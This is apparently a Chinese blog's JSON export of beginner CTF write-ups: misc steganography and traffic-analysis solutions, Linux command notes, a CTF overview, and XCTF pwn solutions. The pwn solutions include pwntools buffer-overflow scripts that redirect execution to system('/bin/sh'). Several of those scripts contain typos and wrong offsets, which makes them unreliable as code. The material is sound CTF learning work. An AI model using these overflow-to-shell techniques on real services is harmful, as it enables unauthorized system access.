构造exp即可","categories":[],"tags":[{"name":"Pwn入门","slug":"Pwn入门","permalink":"https://0410wzn.top/tags/Pwn%E5%85%A5%E9%97%A8/"}]},{"title":"BUUCTF_MISC_WP(更新ing)","slug":"BUUCTF-MISC-WP-更新ing","date":"2021-12-08T14:14:59.000Z","updated":"2021-12-14T06:36:34.646Z","comments":true,"path":"2021/12/08/BUUCTF-MISC-WP-更新ing/","link":"","permalink":"https://0410wzn.top/2021/12/08/BUUCTF-MISC-WP-%E6%9B%B4%E6%96%B0ing/","excerpt":"","text":"BuuCTF杂项WP https://buuoj.cn/challenges 金三胖下载附件如下： 仔细看，会发现有几帧明显有猫腻，果断stegsolve，发现如下几帧： 答案显而易见对吧！ 二维码下载附件如下： 别怕，扫描一下： 很明显，flag似乎就在二维码里，但不能被直接扫描出来，这条路走不通，我们就换条路，从图像本身进行分析 果然有东西！binwalk提取，发现是一个文件夹，里面是一个需要密码的压缩包，旁边是一个文本文档，名叫”4number“，提示很明显了——四位数字爆破 解压，拿到flag！ 你竟然赶我走！hahaha，看看附件： 没啥可说的，010或者hex一看有惊喜 有N种方法解决呐，这个附件打不开！！！—— 用010堪堪罢，惊喜出现 编码开始的地方似乎是让我们把这些base64编码转成图像，说干就干！ 扫一扫，得到答案！ 大白下载附件如图： 又时候，题干很重要，”看不到图？是不是屏幕太小了“——图片的长宽或许有问题！ 根据这个，我们通过010调整宽高，成功获得完整图片，你说flag在哪里呐😍 PNG文件分析 基础破解emmm…都提示暴力破解了，那就乖乖暴力破解吧。 嘿嘿嘿🤭，爆破出来了！ 解压文件，得到一段base64编码，转换即有flag！ 乌镇峰会种图图片里有啥信息？没啥好吧，010或者hex一看就ok 文件中的秘密emmm…不是我不想写，而是没啥可写，球球你康康属性吧。。。 LSBlsb嘛，stegsolve康一康，发现以下三幅图I里都有一些竖形： Data Extract 提示了PNG，我们将其save bin为PNG图片，得到二维码，扫描即可 Wireshark分析流量包，自然是使用wireshark了！ emmm…该看啥啊？ 划重点经过查询之后，了解到了题目中“黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案)”给了不止一个提示——登录用到的请求方式是POST或GET，一般网站采取POST方式（出于安全考虑），故先用POST为条件进行筛选筛选语句如下： http.request.method==POST 只有一条！追踪其TCP流即可找到password，即flag rar告诉4位数字了，爆破就完了呗，拜拜 zip伪加密压缩包文件分析： 依据上述知识点，我们打开010 发现前后各有1个09，伪加密木大错，都改为0000即可,之后就会发现压缩包可以加压力，里面的文件里就是flag qr真就是：“二维码，谁用谁知道”，拜拜~ 被嗅探的流量提到流量分析，自然又是wireshark！ 过滤 flag出来了。 镜子里面的世界这个题啊，镜子里面啊，想隐写啊。（010、binwalk找不出啥来才想的🐶,） LSB!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ningen得到图片，010和属性都没看出啥，于是binwalk，发现图片里面存在一个压缩包，提取即可。 提取出来，爆破即可。 里面的文档即使flag 小明的保险箱,,,跟上一个题不能说完全相似也只能说一模一样了，密码放在下面，溜了 爱因斯坦拿到题后，习惯性看一下属性，发现有一点值得注意的地方 暂且放下，之后010看一看，binwalk看一看，出来个压缩包，唉唉，没密码怎么办？？？ 抱着试一试的想法，填上备注的信息，有惊喜哦，哎嘿。 easycapemmm…全都是TCP流有啥意思，我一个基本不会使wireshark的萌新直接追踪一下流flag就出来了、、、 隐藏的钥匙呐呐呐，属性、010，wait！010真的找出了东西哎！ 依据提示，base64转码即可 另外一个世界属性，010，这次，我们又在010里找到了不寻常的地方 一串2进制编码！ 解码即可。 FLAG 在属性、010、binwalk无果后，我们来试试stegsolve，盲猜lsb（我只知道这个🐕） 左面似乎啥也没有，但我们在右面发现了重头戏！504B0304，不是压缩包的文件头吗！！！果断将其保存为哦压缩文件，暂且无视bandizip的损坏提醒，解压下来堪堪——这是啥？？？！！！ 一头雾水的我选择使用file命令辨别其文件类型 elf文件，这真的是道misc，不是pwn？？？ ida打开，堪堪main函数，神奇的事情出现了！ ok，解决了 假如给我三天光明ctfer当真啥都要会啊。。。 别问，问就是盲文 解出来是“kmdonowg”，很明显是解压码，解压音频，拖入audacity，观察波形图 别问，问就是摩斯电码（一边对着一边打，眼要瞎了） -.-. - ..-. .– .–. . .. —– —.. –… …– ..— ..–.. ..— …– -.. –.. 线上解码即可 神秘龙卷风依照题目所给信息爆破 打开压缩包文本，发现神秘龙卷风 很明显是brainfuck，在线解码即可 后门查杀后门查杀，就查杀后门呗😓 题目已经提醒了密码即为flag，搜索pass，即可找到 数据包中的线索题目要交流内容，交流内容大概率是文本，因此我们把目标放在http协议上，过滤后，得到了以下四个。 emmm，接下来我是一个个看的😂，最后在返回页面的那个流里发现了不同的东西—好长一段编码 bae64解码，flag出现 荷兰带宽数据泄露下载附件之后得到.bin文件，起初并不知道该怎么看，经过查找资料、例题之后，发现这是一个路由器信息恢复类问题，答案可能是username或者password，ctrl+F，果然是username。 来首歌吧音频隐写，拖进audacity， 明显的摩斯 … -… -.-. —-. …— … -… …- —-. -.-. -… —– .—- —… —… …-. … …— . -… .—- –… -… –… —– —-. …— —-. .—- —-. .—- -.-. 在线转码即可出flag Webshell后门emmm，这题和上面的某个题不能说一模一样，也只能说基本类似了，是哪个题我不说🤐 面具下的flag属性里有ps，打开之后无果，010没有思路，最后使用binwalk，发现了压缩包！ 但当我们兴高采烈的准备爆破时 为什么呢？—— 联系前面做题的经验，我们猜测是伪加密 果然是，我们将其更改，如上图 在试过多种方法后，我仍然一头雾水，最终在wp的帮助下解决此题（惭愧） 原来是把文件当压缩文件！ 7Z命令 可以发现，文件就在其中一个压缩包里，密码爆破没给提示，只能从图片入手了，但是，属性、010、binwalk在图片里都没发现有用的东西，最终还是借助wp才做出这道题 提取出了多个文件夹，其中两个明显提示有flag one two 解码即可 九连环下载好图片后，属性没提示，但在010里搜flag发现了一些东西 估计flag就在这个文档里，走，上binwalk！ 里面果然还有东西，把他们都提取出来 steghide的使用 steghide的使用 使用后，我们发现，出现了“ko.txt”这个文件，而它正是压缩包的密码，解压后，打开文档，本题结束。 被劫持的神秘礼物wireshark查看，从题目中“MD5”和“哈希”一下，我们可以推测我们要找的大概率是文本，因此我们优先追踪http流，果然不出所料。 嗯，然后随波逐流哈希一下，嗯 此即为flagヾ(≧▽≦*)o 刷新过的图片提到键盘上的刷新，自然想到F5键，由此我们确定了本题的隐写方式——F5隐写 F555 java Extract “待提取的图片路径” 即会提取出其中文件，如下： 我们查看解出的文件，发现一堆乱码，便怀疑不是文本文件，于是用file一看，果然不是 拖到win里更改后缀，发现解压需要解压码，于是去爆破 为什么没有文件？—— 依照前面的经验，怀疑是伪加密 果然是 解出来了！！！睡觉！！！ Snake属性没啥东西哦，然后堪堪010，结果发现以下·信息 但是——没啥用，还是老老实实binwalk吧 提取出的文件如下所示 cipher里一堆乱码，看key，key里是如下文本 V2hhdCBpcyBOaWNraSBNaW5haidzIGZhdm9yaXRlIHNvbmcgdGhhdCByZWZlcnMgdG8gc25ha2VzPwo= 明显的base64，解码得 What is Nicki Minaj’s favorite song that refers to snakes? 想来应该key是Anaconda(水蚺—南美洲蟒蛇)，但问题又来了，这是个什么编码？？？ 最后经过查看WP，才知晓，这是一种名为“Serpent (蛇; 尤指大蛇;)”，合着这题真就snake了 Serpent 在线解码网址：http://serpent.online-domain-tools.com/ flag解出。 认真你就输了下载得到xls文件，打开时提示文件错误，于是用010一看 有戏！！！ binwalk -e一下，压缩包没加密，解压完找到文件即可 藏藏藏属性、010都没啥，用binwalk发现有zip，解压即可得到二维码 被偷走的文件又是流量分析，祭出wireshark，根据题目所给提示我们应该查找ftp来看文件传输，如下所示 将文件提取出来，目标即是rar文件，因此使用binwalk命令进行分解，得到压缩包，需要密码？ 爆破即可 此题结束。 菜刀666 菜刀与一句话木马有个菜刀叫中国菜刀，有个木马叫一句话木马，因为隐蔽且传输量大，一般工具都是POST方式传参，所以一句话一般写_POST，把这个一句话木马挂到一个网页上，用‘菜刀’连接这一句话木马，一旦它运行，凭借这一句话木马就可以获取网站的管理权限。 由上可知，我们需要看其post，直接追踪http流 发现了好东西！ 佛系青年压缩包直接打不开？爆破不显示文件？ 应该是伪加密吧。 、 果然是！ 提取压缩包之后，我们发现有文本文件 与佛论禅！！！ 论完了，出来了 你猜我是个啥压缩包打开显示格式错误，直接上010堪堪，惊喜出现了！ 神奇的二维码这个题…恶心人！！！ 先扫描神奇的二维码 嗯，神奇之处其在于它一点都不神奇，010无事，上binwalk 提取出来之后（做完再写的wp，可能有的删了） encode内容如下： YXNkZmdoamtsMTIzNDU2Nzg5MA== 明显的base64，解码如下： asdfghjkl1234567890 用这个我们能解压出另一个文件（好像是文档？） 然后最讨厌的第一个地方来了，里面是一段超~长的base64，接下来解码极其烦人，大约套了20层，下面展示两张 出来的——还不是flag！！！ 解压音频文件，au一看 呦，这不是最——最讨人厌的摩斯吗？？？！！！🐶 消耗眼睛手打 –/—/.-./…/./…/…/…-/./.-./-.–/…-/./.-./-.–/./.-/…/-.– 网站解码即可，flag出现！！！ morse2ascii看wp时发现，大佬是这样做的： BASECRACK！原来有个工具叫basecrack！！！ 一叶障目解压文件后，PNG图片能够正常打开，属性也没问题，用010堪堪 提示这个 经查找，发现这个错误一般都是修改宽高造成的，所以我们修改宽高 ok just_a_rar解压——爆破——解压——属性——flag 鸡你太美下下来之后，发现两个后缀都为gif的附件，属性没有问题，打开010查看，发现副本报错，因为都是gif文件，对比后发现副本没有文件头，添加上去，即可 穿越时空的思念拖入au 思路一：不就是摩斯？直接手打，解码即可 思路二：分离声道，kali分析（没想起来，做完看的WP哈哈哈） 纳尼属性无问题，文件打不开，堪堪010，果然，缺少文件头，补上，可以打开。 动图内容如下 Q1RGe3dhbmdfYmFvX3FpYW5nX2lzX3NhZH0= 明显的base64，解码即可 outguessoutguess安装： git clone https://github.com/crorvick/outguess] cd进文件夹 ./configure &amp;&amp; make &amp;&amp; make install 使用： outguess -k 密钥 -d 文件名 存放文件 下载下来之后先看属性， 明显的社会主义核心价值观编码 经过查找后，我们发现outguess是一种隐写方式 excel爆破直接打开文件显示需要密码，选择改变文件后缀名，打开txt，发现内容不少 直接搜索flag，查到","categories":[],"tags":[{"name":"MISC","slug":"MISC","permalink":"https://0410wzn.top/tags/MISC/"}]},{"title":"攻防世界PWN新手区WP（长期更新）","slug":"攻防世界PWN新手区WP（长期更新）","date":"2021-11-17T11:02:54.000Z","updated":"2021-12-09T03:39:11.852Z","comments":true,"path":"2021/11/17/攻防世界PWN新手区WP（长期更新）/","link":"","permalink":"https://0410wzn.top/2021/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CPWN%E6%96%B0%E6%89%8B%E5%8C%BAWP%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/","excerpt":"","text":"攻防世界PWN新手区WP（长期更新） 题目地址：https://adworld.xctf.org.cn/task/task_list?type=pwn&amp;number=2&amp;grade=0 一、get_shell 获取靶场,nc登上查看即可， 二、Hello pwn! 首先拖进ksli里，用checksec看看文件多少位，以及保护措施的开关。 嗯，只开了NX，好耶！ 接下来用64位的ida打开分析逻辑，如下图 看准“&amp;”，重拳出击。很明显，本题要求我们输入数据到unk_601068的位置上，并在dword_60106C等于1853186401时，输出flag。 明白运行逻辑，我们就明白了，我们需要向其中填入垃圾数据时其溢出到dword_60106C，这样程序就可以运行函数拿到flag，脚本如下： 1234567891011from pwn import *context.arch = &quot;amd64&quot;p = remote(&#x27;地址&#x27;， 端口)payload = b&#x27;a&#x27; * (0x60106C - 0x60106C) + p64(1853186401)io.sendlineafter(&quot;bof\\n&quot;, payload)io.interactive() 运行，皆大欢喜。 三、level0 先用checksec看一下文件位数和保护措施，如下图 依旧是只有NX开了，题目应该比较简单 将文件拖入ida，先分析与运行逻辑，再shift + f12, 查看有没有后门函数， 发现上图输入出存在栈溢出可能（buf为80字节，要输入200字节），然后去找后门函数 发现有“/bin/sh”，同时有system，点进去发现后门在名为“callsystem”的函数里，因此我们的目标很明确了，同通过栈溢出将buf覆盖，并将epb转移到函数上，使程序运行后门函数，编写脚本即可，如下： 12345678910111213from pwn import *context,arch = &quot;amd64&quot; // 切换环境io = remote(&#x27;地址&#x27;, 端口)callsystem = 0x400596 // 函数在栈中的位置payload = b&#x27;a&#x27; * (0x80 + 0x08) + p64(callsystem) // 使程序最终运行后门函数io = sendline(payload)io.interactive() 运行脚本，结果如下，成功控制服务器，寻找、查看flag即可。 四、level2 (level1去哪了???)在做完看不见的level1之后，我们来到了level2🐶 首先，查看一下文件的信息与保护措施 32位可执行程序，只开启了NX，因此不能直接使用shellcode，但是可以进行栈溢出，构建ROP链。 拖进ida查看一下 很好，有system函数和/bin/sh字符串，应该不需要自己构建了，溢出覆盖即可，接下来查看函数 main函数如下： 接着查看vulnerable_function函数： 这里存在明显可以发生栈溢出的状况，到这一步，我们的思路基本上确定了，通过溢出覆盖构造一个system(“/bin/sh”)的伪栈帧，vulnerable_function()执行结束后返回到我们构造的伪栈帧去执行system(“bin/sh”)，这样就可以获取shell。 上linux！ 首先查找system函数和/bin/sh/字节的地址（这里刚学习使用elf直接查找，用ida也可以） 接下来就是编写脚本了，具体思路就是： 将返回地址覆盖为system函数，再将system函数引向/bin/sh字节，脚本如下 12345678910111213from pwn import *io = remote(&#x27;地址&#x27;, 端口)sys_addr = 0x8048320bin_addr = 0x804a024payload = b&#x27;a&#x27; * (0x88 + 0x04) + p32(sys_addr) + p32(0) + p32(bin_addr)io.sendline(payload)io.interactive() 其中的p32(0) ，是为了栈平衡，覆盖函数的返回地址，system的参数实际上是两字节后的/bin/sh。","categories":[],"tags":[{"name":"人生苦短，我学Pwn","slug":"人生苦短，我学Pwn","permalink":"https://0410wzn.top/tags/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E5%AD%A6Pwn/"}]},{"title":"linux学习札记","slug":"linux学习札记","date":"2021-10-20T15:35:51.000Z","updated":"2021-10-23T16:17:49.911Z","comments":true,"path":"2021/10/20/linux学习札记/","link":"","permalink":"https://0410wzn.top/2021/10/20/linux%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/","excerpt":"","text":"本学习札记立足于笔者入门linux系统命令学习时，通过OverTheWise的战争游戏，经查询、做题实践后写出，不足之处还请多多见谅。 1、pwd pwd命令常用于得知操作者目前所在的目录名称。 2、ls ls命令用于显示目前操作者所在目录之下的内容 -a 显示所有文件及目录 (. 开头的隐藏文件也会列出) -l 除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出 -r 将文件以相反次序显示(原定依英文字母次序) -t 将文件依建立时间之先后次序列出 -A 同 -a ，但不列出 “.” (目前目录) 及 “..” (父目录) -F 在列出的文件名称后加一符号；例如可执行档则加 “*”, 目录则加 “/“ -R 若目录下有文件，则以下之文件亦皆依序列出 3、 cat cat命令用于连接文件并打印到标准输出设备上 -n 或 –number**：由 1 开始对所有输出的行数编号。 -b 或 –number-nonblank**：和 -n 相似，只不过对于空白行不编号 -s 或 –squeeze-blank**：当遇到有连续两行以上的空白行，就代换为一行的空白行 -v 或 –show-nonprinting**：使用 ^ 和 M- 符号，除了 LFD 和 TAB 之外 -E 或 –show-ends : 在每行结束处显示 $ -T 或 –show-tabs: 将 TAB 字符显示为 ^I -A, –show-all：等价于 -vET -e：**等价于”-vE”选项 -t：**等价于”-vT”选项 例： 4、 file file命令通常用来查看辨别文件命名，与呆板的windows不同，linux不是通过文件后缀名去判断文件为何，而是通过判断文件的文件头来判断的，因此linux可以准确地判断文件为何种类型。 -b 列出辨识结果时，不显示文件名称 -c 详细显示指令执行过程，便于排错或分析程序执行的情形 -f &lt;名称文件&gt; 指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称 -L 直接显示符号连接所指向的文件的类别 -m &lt;魔法数字文件&gt; 指定魔法数字文件 -v 显示版本信息 -z 尝试去解读压缩文件的内容 [文件或目录…] 要确定类型的文件列表，多个文件之间使用空格分开，可以使用shell通配符匹配多个文件 例： 5、 find find一般用来查找指定目录下的文件，如果未加参数，则会将查到的子目录与文件全部显示。 由于参数过多，下面只列出较为常用的部分： -mount, -xdev : 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件 -amin n : 在过去 n 分钟内被读取过 -anewer file : 比文件 file 更晚被读取过的文件 -atime n : 在过去n天内被读取过的文件 -cmin n : 在过去 n 分钟内被修改过 -cnewer file :比文件 file 更新的文件 -ctime n : 在过去n天内被修改过的文件 -empty : 空的文件-gid n or -group name : gid 是 n 或是 group 名称是 name -ipath p, -path p : 路径名称符合 p 的文件，ipath 会忽略大小写 -name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写 -size n : 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k 表示 kilo bytes，w 是二个位元组。 -type c : 文件类型是 c 的文件。 d: 目录 c: 字型装置文件 b: 区块装置文件 p: 具名贮列 f: 一般文件 l: 符号连结 s: socket -pid n : process id 是 n 的文件 例：（这里与下一命令size一起列出）","categories":[],"tags":[{"name":"Linux命令入门","slug":"Linux命令入门","permalink":"https://0410wzn.top/tags/Linux%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/"}]},{"title":"攻防世界MISC新手题部分WP(更新ing)","slug":"攻防世界MISC新手题部分WP-更新ing","date":"2021-10-10T00:34:06.000Z","updated":"2021-10-29T08:51:16.920Z","comments":true,"path":"2021/10/10/攻防世界MISC新手题部分WP-更新ing/","link":"","permalink":"https://0410wzn.top/2021/10/10/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CMISC%E6%96%B0%E6%89%8B%E9%A2%98%E9%83%A8%E5%88%86WP-%E6%9B%B4%E6%96%B0ing/","excerpt":"","text":"攻防世界Misc新手题WP 地址：https://adworld.xctf.org.cn/task/task_list?type=misc&amp;number=1&amp;grade=0 一、PDF 菜猫给了菜狗一张图，说图下面什么都没有 因为题目里明显提示了“下面”，我们自然便能想到文件“下面”藏着什么，其一可能在图片下面藏有信息，其二可能藏有其它文件，于是开始逐步尝试。 首先，我们查看其属性，发现并没有什么隐藏信息，于是开始研究图片下面。 通过办公软件，我们将pdf文件转换成word文档，以此来从物理上观察图片下的信息。 当我们打开word文档，我们惊奇的发现，flag已经明显出现在眼前了！ 复制粘贴结束。 二、give_you_flag 菜狗找到了文件中的彩蛋很开心，给菜猫发了个表情包 下载附件后，看到如下动图。 ​ 题目中提到“文件中的”彩蛋“，所以文件中肯定有一些信息，而一张动图，是由多张静止图片组合成的，由 此想到，运用stegsolve一帧一帧的看，发现一面的一帧藏有信息—一张二维码！！！ 我们使用分帧工具将图片提取出来，得到带有二维码的图片 ​ 很明显，这个二维码缺少定位角，找到定位角用图片编辑工具补上即可。补完后，扫码，flag出现。","categories":[],"tags":[{"name":"入门","slug":"入门","permalink":"https://0410wzn.top/tags/%E5%85%A5%E9%97%A8/"}]},{"title":"CTF简介","slug":"CTF简介","date":"2021-10-09T13:57:31.000Z","updated":"2021-10-29T08:50:20.255Z","comments":true,"path":"2021/10/09/CTF简介/","link":"","permalink":"https://0410wzn.top/2021/10/09/CTF%E7%AE%80%E4%BB%8B/","excerpt":"","text":"一、CTF简介 Capture The Flag（以下简称”CTF”）,顾名思义，即是夺取旗帜，由于相关介绍已经比较完全完全，其简介可见百度知道:CTF词条。 CTF 二、CTF的题目类型​ CTF的题目类型大致包括以下五种： Web，Pwn，Misc， Reverse，Crypto Web​ Web类题目大部分情况下和网、Web、HTTP等相关技能有关。主要考察选手对于Web攻防的一些知识技巧。诸如SQL注入、XSS、代码执行、代码审计等等都是很常见的考点。一般情况下Web题目只会给出一个能够访问的URL。部分题目会给出附件. Pwn​ Pwn类题目重点考察选手对于二进制漏洞的挖掘和利用能力，其考点也通常在堆栈溢出、格式化漏洞、UAF、Double Free等常见二进制漏洞上。选手需要根据题目中给出的二进制可执行文件进行逆向分析，找出其中的漏洞并进行利用，编写对应的漏洞攻击脚本(Exploit)，进而对主办方给出的远程服务器进行攻击并获取flag通常来说Pwn类题目给出的远程服务器信息为nc IP_ADDRESS PORT，例如nc 1.2.3.4 4567这种形式，表示在1.2.3.4这个IP的4567端口上运行了该题目 MiscMisc意为杂项，即不包含在以上分类的题目都会放到这个分类。题目会给出一个附件。选手下载该附件进行分析，最终得出flag 常见的题型有图片隐写、视频隐写、文档隐写、流量分析、协议分析、游戏、IoT相关等等。五花八门，种类繁多。 Reverse​ Reverse题目考察选手逆向工程能力。题目会给出一个可执行二进制文件，有些时候也可能是Android的APK安装包。选手需要逆向给出的程序，分析其程序工作原理。最终根据程序行为等获得flag。 Crypto​ Crypto类题目考察选手对密码学相关知识的了解程度，诸如RSA、AES、DES等都是密码学题目的常客。有些时候也会给出一个加密脚本和密文，根据加密流程逆推出明文。 三、CTF的比赛形式 CTF的比赛形式主要包括以下几种：理论类，Jeopardy-解题)，AwD-攻防，RHG-自动化，RW-真实世界，KoH-抢占山头，MIX-混合 理论类​ 理论题多见于国内比赛，通常为选择题。包含单选及多选，选手需要根据自己所学的相关理论知识进行作答。最终得出分数。理论部分通常多见于初赛或是初赛之前的海选 Jeopardy-解题​ 参赛队伍可以通过互联网或者现场网络参与，参数队伍通过与在线环境交互或文件离线分析，解决网络安全技术挑战获取相应分值，类似于 ACM 编程竞赛、信息学奥林匹克赛，根据总分和时间来进行排名。 不同的是这个解题模式一般会设置 一血(First Blood) 、 二血(Second Blood) 、 三血(Third Blood) ，也即最先完成的前三支队伍会获得额外分值，所以这不仅是对首先解出题目的队伍的分值鼓励，也是一种团队能力的间接体现。 当然还有一种流行的计分规则是设置每道题目的初始分数后，根据该题的成功解答队伍数，来逐渐降低该题的分值，也就是说如果解答这道题的人数越多，那么这道题的分值就越低。最后会下降到一个保底分值后便不再下降。一般称之为动态积分 题目类型主要包含 Web 网络攻防 、 RE 逆向工程 、 Pwn 二进制漏洞利用 、 Crypto 密码攻击以及 Misc 安全杂项 这五个类别，个别比赛会根据题目类型进行扩展。 AwD-攻防​ Attack with Defense(AwD)全称攻防模式，在攻防模式CTF赛制中，参赛队伍连接到同一个网络空间。主办方会预先为每个参赛队分配要防守的主机，该主机称之为GameBox，每个队伍之间的GameBox配置及漏洞是完全一致的，选手需要防护自己的GameBox不被攻击的同时挖掘漏洞并攻击对手服务来得分。在AwD中主办方会运行一个名为Checker的程序定时检测选手的GameBox的运行状态。若检测到状态不对则判定该GameBox宕机，按照规则扣除一定分数。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续24至48小时左右），同时也比团队之间的分工配合与合作。 AwD通常仅包含Web及Pwn两种类型的题目。每个队伍可能会分到多个GameBox，随着比赛的进行，最早的GameBox可能会下线，同时会上线新的GameBox。 RHG-自动化​ Robo Hacking Game(RHG)该利用人工智能或是AI或是自动化攻击程序来全自动的挖掘并利用漏洞，考验选手对于漏洞理解以及工程化能力。比赛开始前(一般为1-4周左右)主办方会给出测试环境以及相关接口文档。选手需要编写自动化程序来请求接口获取题目相关信息，该类程序通常称之为bot，在程序中全自动访问并挖掘目标漏洞，完成利用漏洞攻击并获取flag的过程。获取到的flag也由程序自动化提交。RHG因为是由bot全自动进行工作，所以比赛开始即可视为结束。剩下的一切全看参赛选手编写的自动化bot的工作情况。 比赛过程中不允许选手对bot进行任何的操作(包括debug/patch等等)。选手仅能看到自己的bot完成了哪些题。目前的得分情况等等。 RW-真实世界​ Real World(RW) 首次于2018年长亭科技主办的RealWorldCTF中出现，该赛制着重考察选手在面对真实的环境下的漏洞挖掘与利用能力。通常RW模式出题也会围绕着能够应用于真实渗透攻击当中的漏洞，一般来说RW常见题型为VM/Docker逃逸、针对浏览器的攻击、针对IoT/Car等设备的攻击，Web类攻击等等 在RW赛制中会有一个Show Time，当选手认为自己已经可以完成题目时，选手可以在比赛平台上提交展示申请，由工作人员根据申请先后顺序进行展示排期。选手展示之前需要上台并连接相关网络，同时现场大屏会切换至目标的正常页面。选手确认连接并测试OK之后开始计时。一般情况下上台攻击的时间为5分钟，选手一旦完成攻击现场大屏幕会实时看到攻击的效果，此时裁判会根据效果是否符合题目要求来判定该题是否完成。如5在攻击时间内依然未能看到展示效果则认为本次攻击失败。现如今为了防止选手恶意排期。通常会有一个队伍总展示次数(例如在2019年数字经济云安全公测大赛中每个队伍只允许上台展示30次)，选手也需要尽可能保证上台之后攻击的成功率 举个例子。题目要求需要攻击位于比赛网络中的某个网站并将首页替换为包含队伍名称的页面。题目给出该网站的一些信息(源代码/数据库等等)，选手经过本地挖掘漏洞之后，提交展示申请，排期到了之后进行上台展示。注意，因为RW模式是以展示效果来作为题目是否完成的准则，所以在RW模式中并不存在Flag。 KoH-抢占山头​ King of Hill(KoH)是近些年新衍生的一种赛制。该赛制有点类似于AwD，但是又和AwD有些不一样。选手面对的是一个黑盒的目标，需要先挖掘漏洞并利用漏洞控制目标。将自己的队伍标识(队伍名称或是Token之类)写入到指定文件。随后在该主机上进行加固等操作防止其他队伍攻击，主办方会定期去检查标识文件，根据文件中的队伍标识来判定本回合分数给予哪个队伍。可以看出KoH也是一种对抗极为激烈的赛制，同时考察选手的渗透能力及防御加固能力。 Mix-混合​ 混合模式结合了以上多种模式，现如今单一的赛制已经无法满足比赛及选手的参赛需求，所以大部分比赛会同时以多个模式进行比赛。例如参赛队伍通过解题(Jeopardy)可以获取一些初始分数，然后通过攻防对抗(AwD)进行得分增减的零和游戏，最终以得分高低分出胜负。","categories":[],"tags":[{"name":"萌新","slug":"萌新","permalink":"https://0410wzn.top/tags/%E8%90%8C%E6%96%B0/"}]}],"categories":[],"tags":[{"name":"人生苦短，我学pwn","slug":"人生苦短，我学pwn","permalink":"https://0410wzn.top/tags/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E5%AD%A6pwn/"},{"name":"Pwn入门","slug":"Pwn入门","permalink":"https://0410wzn.top/tags/Pwn%E5%85%A5%E9%97%A8/"},{"name":"MISC","slug":"MISC","permalink":"https://0410wzn.top/tags/MISC/"},{"name":"人生苦短，我学Pwn","slug":"人生苦短，我学Pwn","permalink":"https://0410wzn.top/tags/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E5%AD%A6Pwn/"},{"name":"Linux命令入门","slug":"Linux命令入门","permalink":"https://0410wzn.top/tags/Linux%E5%91%BD%E4%BB%A4%E5%85%A5%E9%97%A8/"},{"name":"入门","slug":"入门","permalink":"https://0410wzn.top/tags/%E5%85%A5%E9%97%A8/"},{"name":"萌新","slug":"萌新","permalink":"https://0410wzn.top/tags/%E8%90%8C%E6%96%B0/"}]}